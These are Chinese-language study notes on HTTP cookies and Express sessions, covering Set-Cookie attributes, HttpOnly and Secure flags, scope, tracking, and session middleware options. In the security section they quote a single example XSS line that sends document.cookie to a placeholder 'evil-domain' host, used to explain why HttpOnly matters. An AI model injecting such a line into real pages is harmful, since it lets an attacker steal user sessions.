# Cookie & session

## Cookie

1. HTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie 使基于无状态的 HTTP 协议记录稳定的状态信息成为了可能。

2. **HTTP** 是无状态协议，它不对之前发生过的请求和响应的状态进行管理，也就是说，无法根据之前的状态进行本次的请求处理。所以引入 Cookie，通过在请求和响应报文中写入 **Cookie** 信息来控制客户端的状态

3. **Cookie**会根据从服务端发送的响应报文内的一个叫做 **Set-Cookie** 的首部字段信息，通知客户端保存 **Cookie**。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文加入**\*Cookie**值后发送出去

## Cookie 主要用于以下三个方面

1. 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
2. 个性化设置（如用户自定义设置、主题等）
3. 浏览器行为跟踪（如跟踪分析用户行为等）

## 缺点

1. 保存在浏览器，用户可以随意修改
2. 不安全， 有限(4k)

## 创建 Cookie

1. 当服务器收到 HTTP 请求时，服务器可以在响应头里面添加一个 Set-Cookie 选项
2. 浏览器收到响应后通常会保存下 Cookie
3. 之后对该服务器每一次请求中都通过 Cookie 请求头部将 Cookie 信息发送给服务器
4. 另外，Cookie 的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。

```js
Set-Cookie: <cookie名>=<cookie值>
// 服务器通过该头部告知客户端保存Cookie信息。
```

| Property | Type | Description |
| :-- | :-- | :-- |
| domain | String | Cookie 的域名。 默认为应用程序的域名。 |
| encode | Function | 用于 cookie 值编码的同步函数。 默认为 encodeURIComponent。 |
| expires | Date | Cookie 在 GMT 中的到期日期。 如果未指定或设置为 0，则创建会话 cookie。 |
| httpOnly | Boolean | 将 Cookie 标记为只能由 Web 服务器访问。 |
| maxAge | Number | 方便的选项，用于设置相对于当前时间的到期时间（以毫秒为单位）。 |
| path | String | Cookie 的路径。 默认为“ /”。 |
| secure | Boolean | 将 cookie 标记为仅与 HTTPS 一起使用。 |
| signed | Boolean | 指示是否应该对 cookie 进行签名。 |
| sameSite | Boolean or String | “ SameSite” Set-Cookie 属性的值。 |

### 会话期 Cookie

会话期 Cookie 是最简单的 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。会话期 Cookie 不需要指定过期时间（Expires）或者有效期（Max-Age）。需要注意的是，有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期 Cookie 也会被保留下来，就好像浏览器从来没有关闭一样。

### 持久性 Cookie

和关闭浏览器便失效的会话期 Cookie 不同，持久性 Cookie 可以指定一个特定的过期时间（Expires）或有效期（Max-Age）。

```js
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
// 提示：当Cookie的过期时间被设定时，设定的日期和时间只与客户端相关，而不是服务端。
```

### Cookie 的 Secure 和 HttpOnly 标记

标记为 Secure 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端。但即便设置了 Secure 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，Secure 标记也无法提供确实的安全保障。从 Chrome 52 和 Firefox 52 开始，不安全的站点（http:）无法使用 Cookie 的 Secure 标记。

为避免跨域脚本 (XSS) 攻击，通过 JavaScript 的 Document.cookie API 无法访问带有 HttpOnly 标记的 Cookie，它们只应该发送给服务端。如果包含服务端 Session 信息的 Cookie 不想被客户端 JavaScript 脚本调用，那么就应该为其设置 HttpOnly 标记。

```js
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```

### Cookie 的作用域

Domain 和 Path 标识定义了 Cookie 的作用域：即 Cookie 应该发送给哪些 URL。

Domain 标识指定了哪些主机可以接受 Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了 Domain，则一般包含子域名。

例如，如果设置 Domain=mozilla.org，则 Cookie 也包含在子域名中（如 developer.mozilla.org）。

Path 标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 %x2F ("/") 作为路径分隔符，子路径也会被匹配。

例如，设置 Path=/docs，则以下地址都会匹配：

/docs /docs/Web/ /docs/Web/HTTP

### JavaScript 通过 Document.cookie 访问 Cookie

通过 Document.cookie 属性可创建新的 Cookie，也可通过该属性访问非 HttpOnly 标记的 Cookie。

```js
document.cookie = 'yummy_cookie=choco';
document.cookie = 'tasty_cookie=strawberry';
console.log(document.cookie);
// logs "yummy_cookie=choco; tasty_cookie=strawberry"
```

## 安全

### 会话劫持和 XSS

在 Web 应用中，Cookie 常用来标记用户或授权会话。因此，如果 Web 应用的 Cookie 被窃取，可能导致授权用户的会话受到攻击。常用的窃取 Cookie 的方法有利用社会工程学攻击和利用应用程序漏洞进行 XSS 攻击。

```js
new Image().src = 'http://www.evil-domain.com/steal-cookie.php?cookie=' + document.cookie;
// HttpOnly类型的Cookie由于阻止了JavaScript对其的访问性而能在一定程度上缓解此类攻击。
```

### 跨站请求伪造（CSRF）

## 追踪和隐私

### 第三方 Cookie

每个 Cookie 都会有与之关联的域（Domain），如果 Cookie 的域和页面的域相同，那么我们称这个 Cookie 为第一方 Cookie（first-party cookie），如果 Cookie 的域和页面的域不同，则称之为第三方 Cookie（third-party cookie.）。一个页面包含图片或存放在其他域上的资源（如图片广告）时，第一方的 Cookie 也只会发送给设置它们的服务器。通过第三方组件发送的第三方 Cookie 主要用于广告和网络追踪。这方面可以看谷歌使用的 Cookie 类型（types of cookies used by Google）。大多数浏览器默认都允许第三方 Cookie，但是可以通过附加组件来阻止第三方 Cookie（如 EFF 的 Privacy Badger）。

如果你没有公开你网站上第三方 Cookie 的使用情况，当它们被发觉时用户对你的信任程度可能受到影响。一个较清晰的声明（比如在隐私策略里面提及）能够减少或消除这些负面影响。在某些国家已经开始对 Cookie 制订了相应的法规，可以查看维基百科上例子 cookie statement。

### 禁止追踪 Do-Not-Track

虽然并没有法律或者技术手段强制要求使用 DNT，但是通过 DNT 可以告诉 Web 程序不要对用户行为进行追踪或者跨站追踪。查看 DNT 以获取更多信息。

### 僵尸 Cookie 和删不掉的 Cookie

Cookie 的一个极端使用例子是僵尸 Cookie（或称之为“删不掉的 Cookie”），这类 Cookie 较难以删除，甚至删除之后会自动重建。它们一般是使用 Web storage API、Flash 本地共享对象或者其他技术手段来达到的。相关内容可以看：

### cookie-encrypter cookie 加密

## session

- 保存在服务端

- 安全，无限

```js
cookie - parse;

cookie - session;
```

multer

consolidate

## session

### cookie-session

```js
const cookieSession = require('cookie-session');
app.use(cookieSession(options));
```

#### options

1. name: 默认 express:sess.
2. keys: `必须`

### express-session

1. name: 设置 cookie 中，保存 session 的字段名称，默认为 connect.sid
2. store: session 的存储方式，默认为存放在内存中，我们可以自定义 redis 等
3. genid: 生成一个新的 session_id 时，默认为使用 uid2 这个 npm 包
4. rolling: 每个请求都重新设置一个 cookie，默认为 false
5. resave: 即使 session 没有被修改，也保存 session 值，默认为 true
6. saveUninitialized：强制未初始化的 session 保存到数据库
7. secret: 通过设置的 secret 字符串，来计算 hash 值并放在 cookie 中，使产生的 signedCookie 防篡改
8. cookie : 设置存放 sessionid 的 cookie 的相关选项
